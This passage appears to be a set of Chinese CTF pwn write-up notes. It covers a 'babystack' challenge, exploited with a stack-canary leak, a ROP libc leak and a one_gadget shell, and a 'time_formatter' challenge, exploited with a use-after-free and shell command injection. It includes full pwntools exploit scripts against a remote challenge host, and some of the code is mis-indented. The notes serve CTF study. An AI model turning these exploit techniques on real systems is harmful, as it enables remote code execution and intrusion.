+0000000000000008  r              db 8 dup(?)
```
从上面可以看出buf距离canary的位置为0x88。

1、思路：为了绕过canary机制，我们需要先想泄露canary的值，然后利用栈溢出，把这个值放到payload中对应的位置里，这样，程序发现canary的值没变，我们就成功绕过。

通过输入1，覆盖到标志位，再输入2 把表示位puts出来.可以通过将s填充满，使puts(s)时将canary泄露出来。

已知:

①canary为防止泄露，第一位已知为'\x00'

②puts()函数输出时，遇到'\x00'才停止，即使字符串中存在'\n',也会继续输出

③read函数在读取长度限制内，能够把'\n'也读进字符串中

```python
#（0）准备（注意题目给的libc与服务器给出的libc版本不一致）
#coding=UTF-8
from pwn import * 
import sys
from time import sleep
context.log_level = "debug"
# context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
#此处的exeaddr不同于以往ROPgadget找到"/bin/sh"和system函数的地址，是用onegadget直接找到execve("/bin/sh", rsp+0x30, environ)的地址，所以只需跳转到此地址即可获得shell。
#命令：one_gadget libc-2.23.so 。 OneGadget，就是直接执行 execve('/bin/sh', NULL, NULL)
    def debug():
        addr = int(raw_input("DEBUG: "), 16)
        gdb.attach(io, "b *" + str(addr))

    if sys.argv[1] == "l":
        io = process("./babystack")
        elf = ELF("./babystack")
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        exe_addr = 0x3f2d6
    else:
        io = remote("1c6a6fb.isec.anscen.cn", 1234)
        elf = ELF("./babystack")
        libc = ELF("./libc-2.23.so")
        exe_addr = 0x45216

#（1）获取canary
 def getCanary():
        io.sendlineafter(">> ", "1")
        payload = cyclic(0x88)
        #  debug()
#发送0x88个padding加上'\n'。先发送0x88长度的字符串+'\n'，read函数会读进0x89个字节，并将canary第一个字节覆盖，之后puts便能将canary泄露出来。
        io.sendline(payload)
        io.sendlineafter(">> ", "2")
        sleep(1)
        io.recvuntil("\n")
        sleep(1)
        canary = u64("\x00" + io.recv(7))
        #  print hex(canary)
        log.debug("leaked canary -> 0x%x" % canary)
        return canary

#（2）获得链接库地址偏移(题目已知libc的情况,libc开启了PIE)
def getBase(canary):
        read_got = elf.got["read"]
        read_plt = elf.plt["read"]
        puts_plt = elf.plt["puts"]
        #  start_plt = elf.symbols["start"]
        #  start_plt = 0x400720
        start_plt = 0x400908
        pop_rdi_ret = 0x0000000000400a93
        pop_rsi_r15_ret = 0x0000000000400a91
        io.sendlineafter(">> ", "1")
        #  log.info("------------------")
#泄露链接库地址基址时，只需将canary的位置使用上一步中泄露出来的canary进行覆盖，获取链接库地址偏移和寄存器利用，详见(http://www.cnblogs.com/ZHijack/p/7900736.html)
#ret2libc尝试和(http://www.cnblogs.com/ZHijack/p/7940686.html)64位简单栈溢出。最后返回start函数，重新执行。
#命令： ROPgadget --binary babystack --only 'pop|ret' | grep 'rdi'
        payload = cyclic(0x88) + p64(canary) * 2 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(start_plt)
        #  print len(payload)
        io.sendline(payload)
        io.sendlineafter(">> ", "3")
        #  debug()
        #  log.info("------------------")
        sleep(1)
        read_leaked = u64(io.recv(6).ljust(8, '\x00'))
        log.debug("read_leaked -> 0x%x" % read_leaked)
        read_libc = libc.symbols["read"]
        libc_base = read_leaked - read_libc
        log.debug("leaked libcBase -> 0x%x" % libc_base)
        return libc_base

#（3）获取shell
def getShell(canary, libcBase):
        io.sendlineafter(">> ", "1")
        exeAddr = libcBase + exe_addr
#重新执行函数后，需重新泄露canary，然后进行溢出，即可获得shell。 
        payload = cyclic(0x88) + p64(canary) * 2 + p64(exeAddr)
        io.sendline(payload)
        #  debug()
        io.sendlineafter(">> ", "3")

        io.interactive()
        io.close()

#（4）主函数执行：
if __name__ == "__main__":
        canary = getCanary()
        libcBase = getBase(canary)
        canary = getCanary()
        getShell(canary, libcBase)
```

虽然程序本身没有开启随机地址，但是其链接库开启了PIE保护，所以我们需要两次溢出：

先获得函数地址在libc库中的偏移，进而得到需要函数在内存中的真实地址，然后在溢出执行system函数获取shell。

writeup2：

（这段payload直接强制记下来吧，没有看懂）
```python
1.#0x88过后0x89开始便是canary，但由于0x89可能是0,为了利用put泄露canary，我们就先将这里覆盖为aa
2.payload='a'*(0x88)
3.
4.c=''
5.#覆盖canary的前导0
6.for i in range(0,8):
7.	sh.send(payload+'a'*i)
8.	sh.recvuntil('>>')
9.	sh.sendline('2')
10.	sh.recv(0x88+i)
11.	c=sh.recvuntil('\n').split('\n')[0]
12.#	print c
13.	l=len(c)
14.	if l>4:#长度大于我们发送的字符串长度，说明数据已经暴露出来了
15.		break;
16.	sh.recvuntil('>>')
17.	sh.sendline('1')
18.#print c
19.#补齐8字节
20.for j in range(0,i):
21. c='\x00'+c
22.
23.#取前8字节数据，这才是canary
24.c=c[0:8]
```
得到了canary，我们就可以进行栈溢出ROP操作了


**此writeup有困扰我很久的问题的题解：（查找pop rdi地址问题）**：

为了将数据放入 rdi 寄存器，我们需要找到一条 pop rdi 的指令，我们不能把指令写在栈里，因为开启了栈不可执行保护。我们发现了，在 IDA 中搜索 pop，我们发现了这里可以被我们利用
我们选择 pop r15，选择 undefine

然后选择下面的两字节数据，选择 Code

就出现了 pop rdi 指令,这是一种巧妙的方法，类似的，我们可以对 r14,r13 操作，获
得其他相关指令，它的地址为 0x400A93，并且过后还有一个 retn，我们完全可以把这里看
成是一个函数的开始

这个writeup应为最符合做法的一个


writeup3：
```python
#GET CANARY
payload = 'a' * 0x88
signal = '95279527'
payload = payload[:-len(signal)] + signal

conn.sendlineafter('>> ', '1')
conn.sendline(payload)

conn.sendlineafter('>> ', '2')
conn.recvuntil(signal + '\n')

'''
    if we use sendline
    then there's an extra '\n' byte
'''

canary = u64(conn.recv(7).rjust(8, '\x00'))

log.info('Canary Found: %s' % hex(canary))
```


## time_formatter

**UAF漏洞**，按下5，进行free之后没有把指针设置为NULL，那么新建堆的地址就是前一个堆的地址，指针仍指向原来的堆地址，通过UAF，使得set_time_zone分配得到的是set_format释放的内存。

```c
//按下1，
fgets(s,1024,stdin)
v0=strdup(s)//malloc+strcpy
qword_602118=v0
//按下3，
fgets(s,1024,stdin)
value=strdup(s)
//按下4，
__snprintf_chk(&command,2048LL,1LL,2048LL,"/bin/data -d @%d + '%s'",(unsigned int)dword_602120,qword_602118,a3);
system(&command)
//按下5，
free(qword_602118)->format
free(value)->time zone
```

知识点1: 

在linux shell中，假如有如下语句,这就是shell注入方面echo ‘’;ls;cat 1.txt;/bin/sh;’’则ls、cat 1.txt、/bin/sh这三个命令会依次执行，这也就是本题突破的关键

知识点2:

C语言或C++申请内存后，用free或delete释放堆后，指针的值还在，如果不手动设置为NULL，就可以被我们利用。

当前一个堆释放后，新创建的堆的地址就是前一个堆的地址，指针仍然指向原来的堆地址。

选项5退出时，释放了堆内存，但是并没有将指针设置为NULL，因此指针仍然指向原来的那个地址。

选项4，有system，这里判断ptr的内容是否为空，于是我们在退出时，选择不退出，这样我们释放了第一个堆，然后我们在选项3中输入注入语句，创建的堆的地址就是第一个堆的地址，也就是ptr指向的内容，最后再选择4，执行getshell。
这就是UAF(use After Free)漏洞，通过UAF使得set_time_zone分配得到的是set_format释放掉的内存。


在函数400F8F中，先释放ptr指针，再询问是否退出，若不退出，则原来指针有被利用的风险


**利用方法：uaf**

先malloc一个format字符串，随便填几个字符。然后free它，（ 这里并没有malloc timezone，不过经过百度，free()一个空指针是没事的）
（此时fastbin里面存上了format的chunk，但是指针还有），然后选项3，malloc 那个timezone，这样写入timezone就是写入format了。
别忘了要选项3设置一个时间，要不程序进行不下去。
最后在选项4 print


**利用use after free**

选择1设置 格式化字符串 （malloc(n)）

选择3设置时区 (malloc(n))，传入参数/bin/sh，利用’’\将参数括起来，‘；’用来传参

选择5 退出 (选择否 ， 目的是 free上面的两个块)

选择3设置时区(消耗时区 free的块)

选择4设置时区 （使用格式化字符串free的块）



1、int snprintf ( char * str, size_t size, const char * format, ... );

参数str -- 目标字符串。

size -- 拷贝字节数(Bytes)。

format -- 格式化成字符串。

... -- 可变参数

我的IDA出现问题，反汇编的结果为__snprintf_chk(&command,2048LL,1LL,2048LL,"/bin/date -d @%d +'%s'",(unsigned int)dword_602120);

而实际上的反汇编为__snprintf_chk(&command,2048LL,1LL,2048LL,"/bin/data -d @%d + '%s'",(unsigned int)dword_602120,ptr,a3);

system(&command)

如果我们可以控制command就可以getshell了，但是command由ptr，也就是我们输入的format控制




